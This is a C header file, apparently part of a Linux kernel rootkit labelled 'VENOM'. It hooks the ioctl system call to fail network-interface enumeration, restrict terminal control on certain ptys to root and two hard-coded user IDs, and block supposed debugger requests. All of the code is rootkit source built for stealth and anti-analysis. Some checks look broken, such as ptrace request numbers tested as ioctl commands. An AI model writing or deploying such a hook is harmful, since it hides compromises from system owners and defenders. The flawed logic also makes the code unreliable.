#ifndef IOCTL_H
#define IOCTL_H

#include "../include/headers.h"

static asmlinkage long (*orig_ioctl)(const struct pt_regs *regs);


#define SIOCGIFCONF     0x8912 
#define SIOCGIFFLAGS    0x8913 
#define SIOCGIFADDR     0x8915 
#define SIOCGIFNETMASK  0x891b 
#define SIOCGIFHWADDR   0x8927 
#define TCGETS          0x5401 
#define TCSETS          0x5402 
#define TIOCGWINSZ      0x5413 
#define TIOCSWINSZ      0x5414  


static asmlinkage long hooked_ioctl(const struct pt_regs *regs) {
    unsigned int fd = (unsigned int)regs->di;
    unsigned int cmd = (unsigned int)regs->si;
    struct file *file;
    

    file = fget(fd);
    if (file) {
        if (cmd == SIOCGIFCONF || cmd == SIOCGIFFLAGS || 
            cmd == SIOCGIFADDR || cmd == SIOCGIFNETMASK ||
            cmd == SIOCGIFHWADDR) {

            if (file->f_op && file->f_op->unlocked_ioctl) {
                fput(file);
                printk(KERN_DEBUG "[VENOM] Blocked network enumeration ioctl: 0x%x from PID %d\n", 
                       cmd, current->pid);
                return -EPERM; 
            }
        }
        

        if (cmd == TCGETS || cmd == TCSETS || cmd == TIOCGWINSZ || cmd == TIOCSWINSZ) {
            if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
                const char *name = file->f_path.dentry->d_name.name;
                
                if (strstr(name, "pts") && 
                    (strstr(name, "0") || strstr(name, "1") || strstr(name, "console"))) {

                    if (current_uid().val != 0 && 
                        current_uid().val != 1001 && 
                        current_uid().val != 1002) { 
                        
                        fput(file);
                        printk(KERN_DEBUG "[VENOM] Blocked TTY manipulation on %s from UID %d\n", 
                               name, current_uid().val);
                        return -EACCES;
                    }
                }
            }
        }
        
        if (cmd == PTRACE_TRACEME || cmd == PTRACE_ATTACH || 
            cmd == PTRACE_DETACH || cmd == PTRACE_PEEKTEXT) {
            
            fput(file);
            printk(KERN_DEBUG "[VENOM] Blocked potential debugger ioctl: 0x%x\n", cmd);
            return -EPERM;
        }
        
        fput(file);
    }
    
    return orig_ioctl(regs);
}

#endif 
